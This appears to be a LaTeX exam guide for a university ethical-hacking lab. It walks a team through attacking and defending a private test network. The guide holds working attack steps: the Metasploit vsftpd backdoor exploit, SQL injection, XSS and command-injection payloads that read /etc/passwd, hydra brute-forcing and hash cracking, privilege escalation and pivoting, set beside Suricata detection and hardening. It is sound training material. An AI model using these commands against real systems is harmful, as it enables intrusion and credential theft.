@@ -1,0 +1,721 @@
+\documentclass[11pt,a4paper]{article}
+\input{ehfe-style.tex}
+\renewcommand{\DocShortTitle}{Post-Configuration Execution Guide}
+
+\begin{document}
+\pagenumbering{gobble}
+
+% ===================== TITLE PAGE =====================
+\begin{titlepage}
+\centering
+\vspace*{1.2cm}
+{\Huge\bfseries\color{navy} CYS 4151 Ethical Hacking Lab}\\[10pt]
+{\Large\color{steel} Post-Configuration Execution Guide --- Tasks 2--13}\\[4pt]
+{\large\color{targetgrey} SecureTech Solutions Ltd. --- Enterprise Security Assessment}\\[28pt]
+
+\begin{tikzpicture}
+\node[rectangle,rounded corners=4pt,draw=steel,line width=0.8pt,fill=lightgrey,
+  inner sep=12pt,text width=0.78\textwidth] {
+  \raggedright
+  \textbf{\color{navy}Scope.} This guide picks up once the lab network described in
+  \emph{CYS 4151 Lab Network Configuration} is live: pfSense routing at
+  \texttt{192.168.50.1}, every client bridged with a verified static IP, and
+  connectivity confirmed end to end. It walks \textbf{Tasks 2--13} of
+  \emph{CYS 4151 Final Examination, Setting A, Summer 2026} in execution order, with
+  the command for each step, which team member runs it, the Red/Blue Team intent
+  behind it, and the expected outcome.
+};
+\end{tikzpicture}
+
+\vspace{28pt}
+{\large\bfseries\color{navy} Lab Team}\\[10pt]
+\renewcommand{\arraystretch}{1.5}
+\begin{tabular}{c c c c}
+\marshall & \fahdil & \rayan & \bruno \\
+\end{tabular}
+
+\vspace{6pt}
+\begin{tabular}{c}
+\amina
+\end{tabular}
+
+\vfill
+{\color{targetgrey}\small Course: CYS 4151 Ethical Hacking \quad|\quad Venue: Cisco Lab \quad|\quad Summer 2026}\\[4pt]
+{\color{targetgrey}\small Document 2 of 2 --- see also \emph{CYS4151 Lab Network Configuration}}
+\end{titlepage}
+
+\pagenumbering{arabic}
+\setcounter{page}{1}
+\tableofcontents
+\clearpage
+
+% ===================== INTRO =====================
+\section{How to Use This Guide}
+
+Each task below states, in order: \textbf{who} runs it (by nickname/team badge), the
+\textbf{strategy} driving that step (Red Team's attack intent or Blue Team's defensive
+intent), the \textbf{command(s)} with inline comments, and the \textbf{expected
+outcome} --- what the output should show and what it justifies doing next. Commands
+shown for Kali/Linux hosts assume a bash shell as root or with \texttt{sudo} where
+needed. All IPs match \emph{CYS 4151 Lab Network Configuration}: pfSense gateway
+\texttt{192.168.50.1}; Suricata-on-Kali IDS \texttt{192.168.50.200} (hosted on PC1 with
+Marshall); Fahdil's Windows 10 workstation \texttt{192.168.50.10}; Rayan's server host
+\texttt{192.168.50.20} with nested DVWA/Juice Shop \texttt{192.168.50.30} and
+Metasploitable \texttt{192.168.50.40}; Bruno's Kali attacker \texttt{192.168.50.100};
+Amina's OpenVAS-on-Kali scanner \texttt{192.168.50.250}.
+
+\begin{redbox}[Red Team Roster]
+\bruno\ --- primary attacker platform, drives most offensive commands.
+\rayan\ --- hosts the shared vulnerable targets and joins Bruno for exploitation,
+privilege escalation, and lateral-movement analysis once the network is confirmed live.
+\end{redbox}
+
+\begin{bluebox}[Blue Team Roster]
+\marshall\ --- pfSense firewall/ACL owner and the Suricata IDS operator (PC1 hosts
+both VMs). \fahdil\ --- hardens and audits the workstation asset. \amina\ --- runs
+OpenVAS vulnerability scanning and CVSS triage.
+\end{bluebox}
+
+\subsection{Before You Start Any Task}
+\begin{steps}
+\item Set hostname and desktop clock visibly (top corner) on every VM you record ---
+  required overlay for all 13 tasks.
+\item Confirm hostname and date/time on each VM before recording.
+\end{steps}
+
+\begin{cmdbox}[Confirm identity overlay prerequisites]
+\begin{cmdverb}
+hostnamectl
+date
+\end{cmdverb}
+\end{cmdbox}
+
+\begin{steps}
+\item Create an evidence folder structure on your host machine and save into the
+  matching folder immediately, not at the end of the day.
+\end{steps}
+
+\begin{cmdbox}[Evidence folder structure]
+\begin{cmdverb}
+mkdir -p ~/CYS4151/Screenshots/Task-{02..13}
+mkdir -p ~/CYS4151/Videos/Task-{02..13}
+\end{cmdverb}
+\end{cmdbox}
+
+\begin{notebox}[Recording checklist]
+Confirm every recording tool (OBS, VirtualBox's own capture, or a phone tripod on the
+physical screen) shows your Student ID and name overlay before you press record ---
+check this once, not per task.
+\end{notebox}
+
+\clearpage
+
+% ===================== TASK 2 =====================
+\section{Task 2 --- Reconnaissance \& Asset Discovery (4 marks)}
+\textbf{Runs on:} \bruno\ (Kali, PC4). \quad\textbf{Goal:} discover every live host on
+\texttt{192.168.50.0/24} and build the asset inventory table.
+
+\begin{redbox}
+Bruno's opening move is a wide, low-noise sweep first (host discovery only, no port
+scan) to map who exists before touching anything --- this limits the footprint Blue
+Team's IDS sees in the first pass. Only after the asset map is built does he escalate
+to per-host fingerprinting (\texttt{-A}), expecting pfSense/Suricata logging to pick
+this up from here on.
+\end{redbox}
+
+\begin{cmdbox}[Host discovery sweep]
+\begin{cmdverb}
+# find every live IP on the subnet without touching any ports yet
+nmap -sn 192.168.50.0/24
+\end{cmdverb}
+\end{cmdbox}
+
+\begin{cmdbox}[OS/service fingerprint pass per discovered host]
+\begin{cmdverb}
+nmap -A 192.168.50.1   -oN scan_pfsense.txt       # gateway/firewall
+nmap -A 192.168.50.10  -oN scan_workstation.txt   # Fahdil's Windows 10 workstation
+nmap -A 192.168.50.20  -oN scan_server.txt        # Rayan's server host
+nmap -A 192.168.50.30  -oN scan_dvwa.txt          # nested DVWA/Juice Shop
+nmap -A 192.168.50.40  -oN scan_metasploitable.txt
+nmap -A 192.168.50.200 -oN scan_suricata.txt      # Marshall's IDS sensor (PC1)
+nmap -A 192.168.50.250 -oN scan_openvas.txt       # Amina's OpenVAS scanner (PC5)
+\end{cmdverb}
+\end{cmdbox}
+
+\begin{expectbox}
+The \texttt{-sn} sweep reports 7 hosts up. Each \texttt{-A} scan returns open
+ports, service versions, and a guessed OS --- record IP, MAC vendor, guessed OS, and
+open ports per host into the asset inventory table (feeds Task 13's Asset Inventory
+deliverable). This output tells Bruno which hosts are worth enumerating further in
+Task 3, and tells Marshall/Amina (Blue Team) what a baseline recon sweep looks like in
+their logs for comparison in Task 11.
+\end{expectbox}
+
+\begin{notebox}[Video/Screenshot]
+\textbf{VIDEO} --- start recording before the \texttt{nmap -sn} sweep, narrate expected
+vs.\ actual host count, stop after the last \texttt{-A} scan. \textbf{SCREENSHOT} ---
+the \texttt{-sn} output, and one \texttt{-A} output per host, overlay visible.
+\end{notebox}
+
+\clearpage
+
+% ===================== TASK 3 =====================
+\section{Task 3 --- Service Enumeration (4 marks)}
+\textbf{Runs on:} \bruno\ (Kali, PC4). \quad\textbf{Goal:} identify service versions,
+protocols, and web technologies on each target to justify which entry points to attack.
+
+\begin{redbox}
+With the asset map from Task 2 in hand, Bruno narrows focus to the hosts that matter
+for exploitation --- Rayan's server/target stack --- and goes deep: every port, every
+version, every script-assisted enumeration. The DVWA/web stack gets its own
+fingerprinting pass since Task 7 depends on knowing exactly what is running there.
+\end{redbox}
+
+\begin{cmdbox}[Full deep port/version scan against server and web targets]
+\begin{cmdverb}
+nmap -sV -sC -p- 192.168.50.20 192.168.50.30 192.168.50.40 -oN full_scan.txt
+\end{cmdverb}
+\end{cmdbox}
+
+\begin{cmdbox}[Fingerprint the web app stack]
+\begin{cmdverb}
+whatweb 192.168.50.30
+curl -I http://192.168.50.30
+\end{cmdverb}
+\end{cmdbox}
+
+\begin{cmdbox}[Targeted NSE scripts against Metasploitable services]
+\begin{cmdverb}
+nmap --script=smb-enum-shares -p445 192.168.50.40
+nmap --script=ftp-anon        -p21  192.168.50.40
+\end{cmdverb}
+\end{cmdbox}
+
+\begin{expectbox}
+\texttt{-sV -sC -p-} returns the full version/service table for all three hosts
+(expect FTP, SSH, Telnet, SMTP, HTTP, SMB and MySQL-class services on the
+Metasploitable target). \texttt{whatweb}/\texttt{curl} return the web server banner and
+DVWA's login page headers. The SMB/FTP NSE scripts report whether shares are
+browsable and whether anonymous FTP is enabled --- both are Task 5/6 candidate
+findings if so.
+\end{expectbox}
+
+\begin{notebox}[Video/Screenshot]
+\textbf{VIDEO} --- record the full \texttt{-sV -sC -p-} scan (narrate what each open
+port could mean while it runs) plus the \texttt{whatweb}/\texttt{curl} step.
+\textbf{SCREENSHOT} --- version/service table per target, and the header output for
+the web app.
+\end{notebox}
+
+\clearpage
+
+% ===================== TASK 4 =====================
+\section{Task 4 --- Threat Modeling \& Risk Identification (4 marks)}
+\textbf{Runs on:} whole team (documentation task, no new commands). \quad\textbf{Goal:}
+turn Task 2/3 findings into a structured threat model.
+
+\begin{steps}
+\item List critical assets (customer data on the server, the web app, employee
+  credentials) and map each to the vulnerabilities/open services found so far.
+\item Identify plausible attacker profiles (external opportunist, disgruntled
+  employee, credential-stuffing bot) and their likely attack vector per asset.
+\item Draft a simple STRIDE or asset-threat-impact table for the Task 13 report.
+\end{steps}
+
+\begin{notebox}[Video/Screenshot]
+\textbf{VIDEO} --- optional but recommended: a short narrated walkthrough of the
+threat/risk table, overlay visible, to cover the one-video-per-task rule.
+\textbf{SCREENSHOT} --- the completed threat model/risk table.
+\end{notebox}
+
+\clearpage
+
+% ===================== TASK 5 =====================
+\section{Task 5 --- Vulnerability Assessment (6 marks)}
+\textbf{Runs on:} \amina\ (OpenVAS-on-Kali, PC5, \texttt{192.168.50.250}).
+\quad\textbf{Goal:} run automated scanning and confirm at least 5 vulnerabilities with
+severity ratings, cross-checked manually.
+
+\begin{bluebox}
+Amina scans proactively, independent of whatever Bruno/Rayan are doing, so Blue Team
+has its own evidence of what is wrong \emph{before} Red Team confirms it by exploiting
+it. A Full and Fast scan against the whole target set gives breadth; the manual
+cross-checks (\texttt{searchsploit}, \texttt{vulners}) add depth and double-source each
+finding, which strengthens the CVSS justification in the final report.
+\end{bluebox}
+
+\begin{cmdbox}[Start the GVM/OpenVAS stack and reach the web UI]
+\begin{cmdverb}
+sudo gvm-start
+# then open https://192.168.50.250:9392 in the browser
+\end{cmdverb}
+\end{cmdbox}
+
+\begin{steps}
+\item In the OpenVAS UI, create a target list (\texttt{192.168.50.20},
+  \texttt{192.168.50.30}, \texttt{192.168.50.40}), then launch a \textbf{Full and Fast}
+  scan against it (GUI step, no CLI equivalent).
+\item Once complete, export the results sorted by CVSS severity (\textbf{Scan Results}
+  $\to$ \textbf{Export} $\to$ CSV/PDF).
+\end{steps}
+
+\begin{cmdbox}[Cross-check at least 2 findings manually]
+\begin{cmdverb}
+searchsploit apache 2.4
+nmap -sV --script=vulners 192.168.50.30
+\end{cmdverb}
+\end{cmdbox}
+
+\begin{expectbox}
+The scan dashboard lists findings sorted High $\to$ Low with CVSS scores. Select and
+document at least 5 with supporting evidence (scan detail page screenshot).
+\texttt{searchsploit}/\texttt{vulners} output either corroborates a scanner finding
+(strengthens it) or surfaces something the automated scan missed --- either way, feed
+the confirmed list into Task 6's exploit selection.
+\end{expectbox}
+
+\begin{notebox}[Difficulty encountered building PC5]
+See \emph{CYS 4151 Lab Network Configuration}, Section 9, for the disk-space exhaustion
+we hit building this scanner (not a VRAM issue) and how we resolved it --- not repeated
+here to avoid duplication.
+\end{notebox}
+
+\begin{notebox}[Video/Screenshot]
+\textbf{VIDEO} --- record scan setup/target configuration, then the results dashboard
+sorted by severity. \textbf{SCREENSHOT} --- scan configuration, results dashboard, and
+the CVSS detail page for each of the 5+ selected vulnerabilities.
+\end{notebox}
+
+\clearpage
+
+% ===================== TASK 6 =====================
+\section{Task 6 --- Controlled Exploitation / Initial Access (6 marks)}
+\textbf{Runs on:} \bruno\ (Kali, PC4), targeting Rayan's nested Metasploitable host.
+\quad\textbf{Goal:} exploit one confirmed vulnerability from Task 5 to gain access.
+
+\begin{redbox}
+This is the centerpiece demo. Bruno picks the clearest, most defensible finding from
+Task 5 (a known Metasploitable2 backdoor is the cleanest teaching example) rather than
+the flashiest one, because the report needs a clean, explainable attack path:
+vulnerability $\to$ exploit $\to$ access $\to$ why it worked.
+\end{redbox}
+
+\begin{cmdbox}[Launch Metasploit and search for a matching module]
+\begin{cmdverb}
+msfconsole
+search type:exploit vsftpd
+\end{cmdverb}
+\end{cmdbox}
+
+\begin{cmdbox}[Configure and run the exploit]
+\begin{cmdverb}
+use exploit/unix/ftp/vsftpd_234_backdoor
+set RHOSTS 192.168.50.40
+set PAYLOAD cmd/unix/interact
+run
+\end{cmdverb}
+\end{cmdbox}
+
+\begin{cmdbox}[Verify access immediately]
+\begin{cmdverb}
+whoami
+id
+hostname
+\end{cmdverb}
+\end{cmdbox}
+
+\begin{expectbox}
+The exploit returns an interactive shell; \texttt{whoami}/\texttt{id} confirm the
+effective user on \texttt{192.168.50.40}. Document the full attack path for Task 13 and
+keep this session open --- Task 9 escalates privileges from exactly this foothold.
+\end{expectbox}
+
+\begin{notebox}[Video/Screenshot]
+\textbf{VIDEO} --- start recording before opening \texttt{msfconsole}; capture module
+selection, exploit execution, and the moment access is confirmed --- do not cut this
+clip, it is the strongest evidence in the report. \textbf{SCREENSHOT} ---
+\texttt{msfconsole} exploit configuration (show options), the successful shell prompt,
+and the \texttt{whoami}/\texttt{id} output.
+\end{notebox}
+
+\clearpage
+
+% ===================== TASK 7 =====================
+\section{Task 7 --- Web Application Security Assessment (6 marks)}
+\textbf{Runs on:} \bruno\ (Kali, PC4) against Rayan's DVWA host
+(\texttt{192.168.50.30}). \quad\textbf{Goal:} demonstrate at least 2 OWASP Top 10
+vulnerabilities.
+
+\begin{redbox}
+Independent of the Metasploitable foothold, Bruno treats the web app as its own attack
+surface --- this is deliberate: a real attacker rarely stops after one entry point, and
+the exam explicitly scores this as a separate task from Task 6.
+\end{redbox}
+
+\begin{steps}
+\item Log in to DVWA and set the security level to \textbf{low} under DVWA Security
+  (clean teaching demo).
+\end{steps}
+
+\begin{cmdbox}[SQL Injection payload]
+\begin{cmdverb}
+' OR '1'='1
+\end{cmdverb}
+\end{cmdbox}
+
+\begin{cmdbox}[Reflected/stored XSS payload]
+\begin{cmdverb}
+<script>alert('XSS')</script>
+\end{cmdverb}
+\end{cmdbox}
+
+\begin{cmdbox}[Alternative second class: Command Injection]
+\begin{cmdverb}
+127.0.0.1; whoami
+127.0.0.1 && cat /etc/passwd
+\end{cmdverb}
+\end{cmdbox}
+
+\begin{expectbox}
+The SQLi payload returns extra rows/data beyond the intended single record (data
+extraction). The XSS payload pops an alert box when the page renders the unescaped
+input. The command-injection payloads append their output (username, or
+\texttt{/etc/passwd} contents) to the page's normal output. Screenshot each payload and
+its result \emph{separately} --- one screenshot per vulnerability, not one for both.
+\end{expectbox}
+
+\begin{notebox}[Video/Screenshot]
+\textbf{VIDEO} --- one continuous clip (or two clearly separated) showing each
+vulnerability: payload entry $\to$ submission $\to$ visible proof of exploitation.
+\textbf{SCREENSHOT} --- before/after for each vulnerability.
+\end{notebox}
+
+\clearpage
+
+% ===================== TASK 8 =====================
+\section{Task 8 --- Credential Security Assessment (4 marks)}
+\textbf{Runs on:} \bruno\ (attack, Kali PC4) against Fahdil's and Rayan's hosts;
+\fahdil\ (policy review, PC2). \quad\textbf{Goal:} audit password policy weaknesses and
+demonstrate a password attack.
+
+\begin{redbox}
+Bruno treats weak/default/reused credentials as the lowest-effort path to access,
+consistent with the scenario's own incident list (``employees using weak or reused
+passwords''). Brute-forcing DVWA's login and SSH on Metasploitable both target
+accounts with no lockout policy --- exactly the gap Blue Team is asked to close.
+\end{redbox}
+
+\begin{cmdbox}[Brute-force the DVWA login form]
+\begin{cmdverb}
+hydra -l admin -P /usr/share/wordlists/rockyou.txt 192.168.50.30 \
+  http-post-form "/dvwa/vulnerabilities/brute/:username=^USER^&password=^PASS^\
+&Login=Login:Login failed"
+\end{cmdverb}
+\end{cmdbox}
+
+\begin{cmdbox}[Brute-force SSH on the Metasploitable target]
+\begin{cmdverb}
+hydra -l msfadmin -P /usr/share/wordlists/rockyou.txt ssh://192.168.50.40
+\end{cmdverb}
+\end{cmdbox}
+
+\begin{cmdbox}[Crack a captured password hash]
+\begin{cmdverb}
+john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
+hashcat -m 0 hash.txt /usr/share/wordlists/rockyou.txt
+\end{cmdverb}
+\end{cmdbox}
+
+\begin{expectbox}
+\texttt{hydra} reports a recovered valid credential pair once it matches a weak entry
+in the wordlist (fast against \texttt{rockyou.txt} because these are intentionally weak
+lab accounts). \texttt{john}/\texttt{hashcat} report the cracked plaintext for any
+captured hash. Each successful crack is direct evidence for the policy weaknesses
+Fahdil documents next.
+\end{expectbox}
+
+\begin{bluebox}
+\fahdil\ reviews the workstation's local account policy (or the DVWA/service login
+policy) and records concrete weaknesses observed from the attack above: no lockout
+threshold, no complexity rule, default credentials still active. Recommendations:
+enforce lockout after N failed attempts, minimum complexity, and MFA where the
+platform supports it --- feeds directly into Task 12's hardening plan.
+\end{bluebox}
+
+\begin{notebox}[Video/Screenshot]
+\textbf{VIDEO} --- record the \texttt{hydra}/\texttt{john} run from launch to a
+successful cracked credential, with the policy weakness explained in narration.
+\textbf{SCREENSHOT} --- the password policy weakness (config/settings page) and the
+successful brute-force/crack output.
+\end{notebox}
+
+\clearpage
+
+% ===================== TASK 9 =====================
+\section{Task 9 --- Privilege Escalation \& Persistence Analysis (5 marks)}
+\textbf{Runs on:} \bruno\ \& \rayan\ (from the Task 6 session on
+\texttt{192.168.50.40}). \quad\textbf{Goal:} escalate from low-privilege access to
+admin/root, and discuss (without deploying) persistence mechanisms.
+
+\begin{redbox}
+From the foothold gained in Task 6, Red Team enumerates escalation paths rather than
+guessing --- SUID binaries, sudo misconfiguration, and kernel version are the three
+fastest wins on an intentionally old target like Metasploitable2.
+\end{redbox}
+
+\begin{cmdbox}[Enumerate escalation paths]
+\begin{cmdverb}
+sudo -l
+find / -perm -4000 -type f 2>/dev/null
+uname -a
+\end{cmdverb}
+\end{cmdbox}
+
+\begin{cmdbox}[Search for a matching local privilege-escalation exploit]
+\begin{cmdverb}
+searchsploit linux kernel 2.6
+\end{cmdverb}
+\end{cmdbox}
+
+\begin{cmdbox}[Execute and confirm elevated access]
+\begin{cmdverb}
+id
+whoami
+\end{cmdverb}
+\end{cmdbox}
+
+\begin{expectbox}
+\texttt{find ... -perm -4000} lists SUID binaries; one of them (or a kernel exploit
+matched by \texttt{searchsploit}) yields root. \texttt{id}/\texttt{whoami} after
+escalation show \texttt{uid=0(root)}. Discuss --- in the report/narration only, do not
+deploy --- how an attacker could persist afterwards: a cron job, a scheduled task, an
+added user account, or a planted SSH key.
+\end{expectbox}
+
+\begin{notebox}[Video/Screenshot]
+\textbf{VIDEO} --- record enumeration through confirmed root/admin access; narrate the
+persistence discussion since it is not executed live. \textbf{SCREENSHOT} ---
+enumeration output showing the escalation vector, and the confirmed elevated-privilege
+prompt.
+\end{notebox}
+
+\clearpage
+
+% ===================== TASK 10 =====================
+\section{Task 10 --- Post-Exploitation \& Lateral Movement Analysis (5 marks)}
+\textbf{Runs on:} \bruno\ \& \rayan\ (from the escalated session on
+\texttt{192.168.50.40}). \quad\textbf{Goal:} show what an attacker could reach next
+from the compromised host.
+
+\begin{redbox}
+Red Team treats the compromised Metasploitable host as a pivot point, not an endpoint
+--- the question is what it can reach that Bruno's own Kali box cannot directly, which
+is the realistic shape of lateral movement in a segmented network.
+\end{redbox}
+
+\begin{cmdbox}[Enumerate the internal network view from the compromised host]
+\begin{cmdverb}
+arp -a
+netstat -antp
+cat /etc/hosts
+ip route
+\end{cmdverb}
+\end{cmdbox}
+
+\begin{cmdbox}[Identify and use a pivot target]
+\begin{cmdverb}
+proxychains nmap -sT 192.168.50.0/24
+ssh -L 8080:192.168.50.250:80 user@192.168.50.40
+\end{cmdverb}
+\end{cmdbox}
+
+\begin{expectbox}
+\texttt{arp -a}/\texttt{netstat} reveal hosts and connections visible only from inside
+the compromised machine's vantage point. If pfSense's ACL (see
+\emph{Lab Network Configuration}, rule 5) is working as designed, the proxychains sweep
+should \emph{not} reach hosts outside the declared \texttt{Target\_Hosts} alias ---
+document this as evidence the segmentation rule holds even after a target is
+compromised.
+\end{expectbox}
+
+\begin{notebox}[Video/Screenshot]
+\textbf{VIDEO} --- record the enumeration commands and, if performed, the pivot/tunnel
+setup and resulting access. \textbf{SCREENSHOT} --- internal enumeration output and,
+if performed, evidence of reaching (or being blocked from) the second host.
+\end{notebox}
+
+\clearpage
+
+% ===================== TASK 11 =====================
+\section{Task 11 --- Blue Team Investigation: Traffic \& Logs (5 marks)}
+\textbf{Runs on:} \marshall\ (Suricata-on-Kali, PC1, \texttt{192.168.50.200}).
+\quad\textbf{Goal:} capture and analyze evidence of the Red Team's activity from the
+defensive side.
+
+\begin{bluebox}
+Marshall's Suricata sensor sits in promiscuous mode on the LAN backbone (see
+\emph{Lab Network Configuration}, Section 5), so it sees Bruno and Rayan's traffic
+regardless of which host they attack from or to. The goal is to show the same attack
+twice: once from the attacker's shell (Tasks 6--10) and once from the defender's
+packet/log evidence here --- this pairing is what makes detection credible in the
+final report.
+\end{bluebox}
+
+\begin{cmdbox}[Live packet capture during/alongside an earlier attack]
+\begin{cmdverb}
+tshark -i eth0 -w capture.pcap
+\end{cmdverb}
+\end{cmdbox}
+
+\begin{cmdbox}[Filter for the relevant traffic signature]
+\begin{cmdverb}
+tshark -r capture.pcap -Y "http.request or tcp.flags.syn==1"
+# Wireshark GUI filter bar: ip.addr==192.168.50.30 and tcp.flags.syn==1
+\end{cmdverb}
+\end{cmdbox}
+
+\begin{cmdbox}[Live Suricata alerts matching the same activity]
+\begin{cmdverb}
+sudo tail -f /var/log/suricata/eve.json | jq 'select(.event_type=="alert")'
+\end{cmdverb}
+\end{cmdbox}
+
+\begin{cmdbox}[Matching evidence from target-side logs]
+\begin{cmdverb}
+tail -f /var/log/auth.log
+# Windows: Event Viewer > Windows Logs > Security, or:
+wevtutil qe Security /f:text /c:20
+\end{cmdverb}
+\end{cmdbox}
+
+\begin{expectbox}
+The filtered Wireshark/tshark view isolates the SYN floods and HTTP requests from
+Bruno's scans/exploitation. \texttt{eve.json} shows matching Suricata alert objects
+timestamped to the same window. The target's own \texttt{auth.log}/Security event log
+shows the corresponding failed/successful login entries. Explain, in the report, how
+this traffic/log pattern would be detected and alerted on in production.
+\end{expectbox}
+
+\begin{notebox}[Video/Screenshot]
+\textbf{VIDEO} --- record the live capture running alongside (or replaying) the attack,
+then the filtered Wireshark view and the matching log entries. \textbf{SCREENSHOT} ---
+filtered capture showing the attack signature, and the corresponding log entries.
+\end{notebox}
+
+\clearpage
+
+% ===================== TASK 12 =====================
+\section{Task 12 --- Security Hardening \& Incident Response (5 marks)}
+\textbf{Runs on:} \marshall\ (pfSense rule, PC1); \fahdil\ (workstation hardening,
+PC2); \amina\ (findings list, PC5). \quad\textbf{Goal:} produce the remediation plan
+built from everything found in Tasks 5--11.
+
+\begin{bluebox}
+Blue Team closes the loop: every confirmed finding from Task 5 (OpenVAS) and every
+successful attack path from Tasks 6--10 gets a specific, named fix here, not a generic
+``patch everything'' statement --- this is what turns the assessment into an
+actionable report rather than just a list of scary findings.
+\end{bluebox}
+
+\begin{steps}
+\item For each vulnerability/finding, write a specific hardening step (patch version,
+  disable unused service, enforce password policy).
+\end{steps}
+
+\begin{cmdbox}[Demonstrate patch management as evidence of remediation]
+\begin{cmdverb}
+sudo apt update && sudo apt upgrade -y
+\end{cmdverb}
+\end{cmdbox}
+
+\begin{steps}
+\item Add a pfSense firewall rule addressing a Task 5/6 finding (e.g.\ restrict access
+  to the vulnerable service to only the hosts that legitimately need it) --- GUI step
+  under \textbf{Firewall} $\to$ \textbf{Rules} $\to$ \textbf{LAN} $\to$ \textbf{Add},
+  following the same ordered-rule method used in \emph{Lab Network Configuration},
+  Section 10. Screenshot the rule as configured.
+\end{steps}
+
+\begin{cmdbox}[Optional host-level firewall hardening on a Linux target]
+\begin{cmdverb}
+sudo ufw allow from 192.168.50.0/24 to any port 22
+sudo ufw enable
+\end{cmdverb}
+\end{cmdbox}
+
+\begin{expectbox}
+\texttt{apt upgrade} shows the target packages moving to patched versions (re-run the
+Task 3 service scan afterward to confirm the version string changed). The new pfSense
+rule appears in \textbf{Diagnostics} $\to$ \textbf{States} the next time that service is
+reached, with the narrower source/destination match now visible. \texttt{ufw status}
+confirms the host-level rule is active.
+\end{expectbox}
+
+\begin{steps}
+\item Write a brief incident response workflow: detection $\to$ containment $\to$
+  eradication $\to$ recovery $\to$ lessons learned, tied back to the Task 11 detection
+  evidence (which Suricata alert / log entry triggered each stage).
+\end{steps}
+
+\begin{notebox}[Video/Screenshot]
+\textbf{VIDEO} --- optional: a short narrated walkthrough of the pfSense rule being
+added, plus the remediation plan on screen. \textbf{SCREENSHOT} --- the pfSense rule
+configuration screen, and the completed hardening/IR plan document.
+\end{notebox}
+
+\clearpage
+
+% ===================== TASK 13 =====================
+\section{Task 13 --- Professional Penetration Testing Report (11 marks)}
+\textbf{Runs on:} whole team (compilation and writing, no new hands-on-keyboard work).
+\quad\textbf{Goal:} assemble everything above into the final deliverable.
+
+\begin{steps}
+\item Structure the report: Executive Summary, Scope, Methodology (reference
+  PTES/NIST SP 800-115/OWASP Testing Guide as stated in the exam), Findings, Risk
+  Ratings, Evidence, Business Impact, Recommendations, Conclusion.
+\item Pull in the Network Architecture Diagram (\emph{Lab Network Configuration},
+  Figure 1), Asset Inventory (Task 2), Vulnerability Assessment Report (Task 5), Risk
+  Register (Task 4/12), and Security Hardening Plan (Task 12) as clearly labeled
+  sections or appendices.
+\item Insert the best screenshot per task into the relevant findings section, captioned
+  with the task number.
+\item Proofread for the overlay requirement across all video evidence before final
+  submission --- spot-check timestamps in at least 3 videos.
+\end{steps}
+
+\begin{notebox}
+No new video is required for this task itself, since it is the compiled write-up of
+Tasks 1--12.
+\end{notebox}
+
+\begin{expectbox}
+\textbf{SCREENSHOT} --- final report title page and table of contents, confirming all
+required sections/appendices are present, for your own submission checklist.
+\end{expectbox}
+
+\clearpage
+
+% ===================== FINAL CHECKLIST =====================
+\section{Final Submission Checklist}
+
+\begin{itemize}[nosep]
+\item Professional Penetration Testing Report (PDF)
+\item Network Architecture Diagram
+\item Asset Inventory
+\item Vulnerability Assessment Report
+\item Risk Register
+\item Security Hardening Plan
+\item Screenshots supporting every task (organized by Task-02 \ldots Task-13 folders)
+\item One video per task (organized the same way), each showing name, Student ID,
+  hostname, username, and live date/time throughout
+\item Source files where applicable (scan exports, Wireshark \texttt{.pcap}, scripts
+  used)
+\end{itemize}
+
+\begin{notebox}[Overlay Reminder]
+Full legal name, Student ID, hostname, active username, and live system date/time must
+be visible on screen for the whole clip. Keep narration continuous --- no cuts.
+\end{notebox}
+
+\end{document}
